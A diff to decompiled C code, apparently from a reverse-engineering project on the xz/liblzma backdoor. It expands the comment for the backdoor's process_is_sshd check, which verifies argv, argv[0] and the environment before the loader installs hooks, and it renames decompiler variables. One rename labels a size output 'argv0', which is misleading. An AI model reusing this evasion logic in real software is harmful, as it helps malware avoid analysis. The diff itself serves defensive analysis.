@@ -5,7 +5,12 @@
 
 
 /*
- * AutoDoc: Walks argv and envp from the saved stack pointer to ensure the process really is sshd, no debug flags are active, and no suspicious environment settings are present. Backdoor setup treats this as a hard prerequisite before it touches ld.so or installs any hooks.
+ * AutoDoc: Replays sshd's early argument parsing from the saved stack pointer: it verifies the argc/argv
+ * tuple is sane, checks argv[0] hashes to '/usr/sbin/sshd', walks every argument through
+ * `check_argument`, and then ensures envp pointers either live on the stack or inside the ELF
+ * .data segment. Any environment string that maps to a known identifier (get_string_id != 0)
+ * aborts the run, which keeps the loader from running inside unexpected binaries or
+ * instrumentation harnesses.
  */
 #include "xzre_types.h"
 
@@ -21,7 +26,10 @@ BOOL process_is_sshd(elf_info_t *elf,u8 *stack_end)
   long lVar6;
   ulong *puVar7;
   bool bVar8;
-  u64 local_40 [2];
+  u8 *data_segment;
+  ulong *envp;
+  long argc;
+  u8 *argv0;
   
   if (((((&stack0xfffffffffffffff8 < stack_end) &&
         ((ulong)((long)stack_end - (long)&stack0xfffffffffffffff8) < 0x2001)) &&
@@ -55,12 +63,12 @@ BOOL process_is_sshd(elf_info_t *elf,u8 *stack_end)
             return 0;
           }
           if ((puVar2 <= stack_end) || (0x4000 < (ulong)((long)puVar2 - (long)stack_end))) {
-            local_40[0] = 0;
-            puVar5 = (u8 *)elf_get_data_segment(elf,local_40,1);
+            argv0 = (u8 *)0x0;
+            puVar5 = (u8 *)elf_get_data_segment(elf,(u64 *)&argv0,1);
             if (puVar5 == (u8 *)0x0) {
               return 0;
             }
-            if (puVar5 + local_40[0] < puVar2 + 0x2c) {
+            if (argv0 + (long)puVar5 < puVar2 + 0x2c) {
               return 0;
             }
             if (puVar2 < puVar5) {
